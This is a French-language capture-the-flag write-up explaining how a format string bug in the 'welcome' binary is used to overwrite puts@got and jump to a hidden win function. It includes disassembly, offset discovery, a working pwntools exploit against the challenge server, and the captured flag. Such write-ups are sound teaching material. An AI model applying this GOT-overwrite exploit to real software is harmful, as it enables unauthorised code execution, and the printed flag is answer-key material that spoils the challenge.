# Write-up — `welcome` (PWN)

> **Flag :** `LzPn{H3lL0_f0rM47_mY_0lD_FR13nd_40b3df53}`
> **Catégorie :** Pwn / Binary Exploitation
> **Vulnérabilité :** Format string → GOT overwrite → ret2win

---

## 1. Reconnaissance

### 1.1. Le binaire

```bash
$ file welcome
welcome: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

### 1.2. Protections (`checksec`)

| Protection | État |
|---|---|
| **RELRO** | Partial 🟠 (la GOT est writable) |
| **Canary** | ✅ |
| **NX** | ✅ |
| **PIE** | ❌ (adresses fixes à `0x400000`) |

Deux infos critiques pour la suite :
- **Partial RELRO** → on peut écrire dans `.got.plt`
- **No PIE** → les adresses du binaire sont **fixes**, pas besoin de leak

### 1.3. Strings intéressantes

```
/tmp/flag.txt
Could not open flag file! Abort
Congratz, the flag is: %s
Hello there, what is your name?
Nice to meet you
I like your name, can I buy you a flag?
```

La présence de `/tmp/flag.txt` et `Congratz, the flag is: %s` indique qu'il existe une fonction "win" cachée qui sait lire le flag. Il faut juste trouver comment l'appeler.

---

## 2. Analyse statique

### 2.1. La fonction "win" (`0x40127b`)

```asm
401296: mov esi, 0x402008      ; "r"
40129b: mov edi, 0x40200a      ; "/tmp/flag.txt"
4012a0: call fopen
...
4012d4: call fgets             ; lit le flag
...
4012e0: mov edi, 0x402038      ; "Congratz, the flag is: %s "
4012ea: call printf
```

➡️ Cette fonction n'est **jamais appelée** par le `main`. Notre objectif : la déclencher.

### 2.2. La fonction vulnérable (`0x401312`)

```asm
401321: mov rax, fs:0x28        ; canary
401330: mov edi, 0x402058        ; "Hello there, what is your name?"
401335: call puts
401348: mov esi, 0x400           ; fgets max 1024 bytes
401350: call fgets               ; lit dans buffer[1040]
...
401364: lea rax, [rbp-0x410]
40136b: mov rdi, rax
40136e: call printf              ; ⚠️ printf(buffer) — FORMAT STRING !
401378: mov edi, 0x402090
40137d: call puts                ; "I like your name..."
```

### 2.3. Identification de la vulnérabilité

Deux faits :

1. **Buffer overflow impossible** : `fgets` lit max `0x400` (1024) octets, mais l'offset jusqu'à `saved RIP` est `0x410 + 8 = 1048`. Et il y a un canary.
2. **Format string** : `printf(buffer)` à `0x40136e` passe directement notre input comme premier argument à `printf`, sans `"%s"`. **Vulnérabilité format string** ✅

---

## 3. Exploitation

### 3.1. Stratégie

> **Plan** : utiliser la format string pour réécrire l'entrée GOT de `puts` afin qu'elle pointe vers la fonction "win". Quand le binaire appelle `puts("I like your name...")` juste après, il sautera dans la fonction win qui imprimera le flag.

| Élément | Adresse |
|---|---|
| `puts@got` | `0x404018` |
| Fonction "win" | `0x40127b` |
| Valeur initiale `puts@got` | `0x4010b6` (puts@plt+6, lazy binding) |

### 3.2. Trouver l'offset format string

On envoie un pattern de reconnaissance pour trouver où notre buffer apparaît dans la stack :

```python
p.sendline(b'AAAAAAAA-' + b'.%p' * 10)
```

Sortie :
```
AAAAAAAA.0x7fffe54b87e0.(nil).(nil).0x11.0x11.0x4141414141414141.0x252e70252e70252e...
                                              └─ position 6 ─┘
```

➡️ **Notre buffer est à l'offset 6.** Sur x86_64, c'est logique : les positions 1-5 correspondent aux registres `RSI, RDX, RCX, R8, R9`, et la position 6 est le premier qword de la stack — où commence notre buffer.

### 3.3. Construction du payload

On veut écrire `0x40127b` à l'adresse `0x404018`. Avec `pwntools`, `fmtstr_payload` automatise le calcul des `%c` et `%hn` :

```python
from pwn import *

context.binary = './welcome'
context.arch = 'amd64'
context.bits = 64

elf = ELF('./welcome')
p = remote('116.203.154.117', 38689)

WIN = 0x40127b
puts_got = elf.got['puts']    # 0x404018

# offset 6, écriture par paquets de 2 bytes
payload = fmtstr_payload(6, {puts_got: WIN}, write_size='short')

p.recvuntil(b'name?')
p.sendline(payload)
p.interactive()
```

**Points clés :**
- `context.arch = 'amd64'` — sans ça, `fmtstr_payload` génère un payload 32-bit avec un mauvais alignement
- `write_size='short'` — écrit 2 octets à la fois via `%hn`, bon compromis entre nombre d'écritures et taille du compteur

### 3.4. Pourquoi ça marche

```
Avant exploit :  puts@got = 0x00000000004010b6   → puts@plt+6 (résolveur lazy)
Après exploit :  puts@got = 0x000000000040127b   → fonction "win"
```

Quand le binaire exécute ensuite :
```asm
401378: mov edi, 0x402090
40137d: call puts          ; saute en réalité dans win() !
```

➡️ `win()` ouvre `/tmp/flag.txt`, lit le flag, et l'imprime via `printf("Congratz, the flag is: %s ")`. 🏁

---

## 4. Sortie

```
$ python3 exploit_final.py
[*] puts@got = 0x404018
[*] win      = 0x40127b
[+] Opening connection to 116.203.154.117 on port 38689: Done
[*] Switching to interactive mode

Nice to meet you ...padding...\x00\x18@@
Congratz, the flag is: LzPn{H3lL0_f0rM47_mY_0lD_FR13nd_40b3df53}
```

🚩 **Flag : `LzPn{H3lL0_f0rM47_mY_0lD_FR13nd_40b3df53}`**

---

## 5. Récap des leçons

1. **Toujours regarder les strings et les fonctions** — la fonction "win" était dans le binaire dès le départ.
2. **Format string = vulnérabilité d'écriture arbitraire** quand `printf(user_input)` est utilisé.
3. **Partial RELRO + No PIE** = combo idéal pour un GOT overwrite : la GOT est writable et les adresses sont fixes.
4. **Sur x86_64**, l'offset format string commence typiquement à 6 à cause des 5 registres d'arguments.
5. **`fmtstr_payload` de pwntools** automatise tout, mais il faut absolument définir `context.arch` correctement.

## 6. Bonus — debug timeline

Pendant l'exploitation, plusieurs essais ont échoué avant le succès :

| Tentative | Problème | Leçon |
|---|---|---|
| `fmtstr_payload(6, ...)` v1 | `context.arch` non défini → mauvais alignement | Toujours setter le contexte pwntools |
| Manuel avec `[adresse][%c%hn]` | Null bytes en début, désync | Mettre l'adresse APRÈS les directives |
| Manuel avec `[%c%hn][padding][adresse]` à offset 8 | Probable offset incorrect malgré le calcul | `fmtstr_payload` connaît mieux que nous |
| `fmtstr_payload(6, ..., write_size='short')` ✅ | — | Le bon paramètre fait toute la différence |
